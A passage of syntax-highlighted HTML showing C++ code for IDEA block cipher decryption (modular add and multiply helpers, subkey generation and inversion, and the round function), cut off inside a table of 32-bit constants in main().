    <span class="token keyword">return</span> code_1 <span class="token operator">^</span> code_2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">Plus</span><span class="token punctuation">(</span>code code_1<span class="token punctuation">,</span> code code_2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        tmp <span class="token operator">+=</span> code_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> code_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    tmp <span class="token operator">%=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">invPlus</span><span class="token punctuation">(</span>code code_in<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        tmp <span class="token operator">+=</span> code_in<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    tmp <span class="token operator">=</span> <span class="token number">65536</span> <span class="token operator">-</span> tmp<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">Times</span><span class="token punctuation">(</span>code code_1<span class="token punctuation">,</span> code code_2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp_1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> tmp_2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        tmp_1 <span class="token operator">+=</span> code_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tmp_2 <span class="token operator">+=</span> code_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp_1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        tmp_1 <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp_2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        tmp_2 <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span>tmp_1 <span class="token operator">*</span> tmp_2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">65537</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>tmp <span class="token operator">==</span> <span class="token number">65536</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">Exgcd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span>x<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>b<span class="token punctuation">)</span>
        x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">Exgcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> y <span class="token operator">-=</span> a <span class="token operator">/</span> b <span class="token operator">*</span> x<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

code <span class="token function">invTimes</span><span class="token punctuation">(</span>code code_in<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        tmp <span class="token operator">+=</span> code_in<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>
    <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">65537</span><span class="token punctuation">;</span>
    <span class="token function">Exgcd</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> p<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
    x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">%</span> p <span class="token operator">+</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">bitset</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">subkeys_get</span><span class="token punctuation">(</span>code keys_input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    key keys<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            keys<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> keys_input<span class="token punctuation">[</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        key tmp_keys <span class="token operator">=</span> keys <span class="token operator">>></span> <span class="token number">103</span><span class="token punctuation">;</span>
        keys <span class="token operator">=</span> <span class="token punctuation">(</span>keys <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> tmp_keys<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>
                sub_key<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> <span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    key tmp_keys <span class="token operator">=</span> keys <span class="token operator">>></span> <span class="token number">103</span><span class="token punctuation">;</span>
    keys <span class="token operator">=</span> <span class="token punctuation">(</span>keys <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> tmp_keys<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">52</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">inv_subkeys_get</span><span class="token punctuation">(</span>code sub_key<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        inv_sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">48</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">50</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">49</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">51</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> sub_key<span class="token punctuation">[</span><span class="token number">46</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> sub_key<span class="token punctuation">[</span><span class="token number">47</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    inv_sub_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    inv_sub_key<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> <span class="token function">dencrypt</span><span class="token punctuation">(</span>bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> cipher<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> I_1<span class="token punctuation">,</span> I_2<span class="token punctuation">,</span> I_3<span class="token punctuation">,</span> I_4<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        I_1<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">63</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        I_2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">47</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        I_3<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        I_4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_1 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> I_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_2 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> I_2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_3 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> I_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_4 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> I_4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_5 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_1<span class="token punctuation">,</span> tmp_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_6 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_2<span class="token punctuation">,</span> tmp_4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_7 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tmp_5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_8 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>tmp_6<span class="token punctuation">,</span> tmp_7<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_9 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>tmp_8<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_10 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>tmp_7<span class="token punctuation">,</span> tmp_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_1 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_1<span class="token punctuation">,</span> tmp_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_2 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_3<span class="token punctuation">,</span> tmp_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_3 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_2<span class="token punctuation">,</span> tmp_10<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_4 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_4<span class="token punctuation">,</span> tmp_10<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_1 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>I_1<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_2 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>I_3<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_3 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>I_2<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_4 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>I_4<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> plaint<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        plaint<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Y_4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        plaint<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> Y_3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        plaint<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> Y_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        plaint<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> Y_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> plaint<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> box1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xC0BA6CAC</span><span class="token punctuation">,</span> <span class="token number">0x5A05DF1B</span><span class="token punctuation">,</span> <span class="token number">0x9ABFB3B7</span><span class="token punctuation">,</span> <span class="token number">0xB40BBE36</span><span class="token punctuation">,</span> <span class="token number">0x74B1D29A</span><span class="token punctuation">,</span>
        <span class="token number">0xEE0E612D</span><span class="token punctuation">,</span> <span class="token number">0x2EB40D81</span><span class="token punctuation">,</span> <span class="token number">0xB3667A2F</span><span class="token punctuation">,</span> <span class="token number">0x73DC1683</span><span class="token punctuation">,</span> <span class="token number">0xE963A534</span><span class="token punctuation">,</span> <span class="token number">0x29D9C998</span><span class="token punctuation">,</span> <span class="token number">0x076DC419</span><span class="token punctuation">,</span> <span class="token number">0xC7D7A8B5</span><span class="token punctuation">,</span>
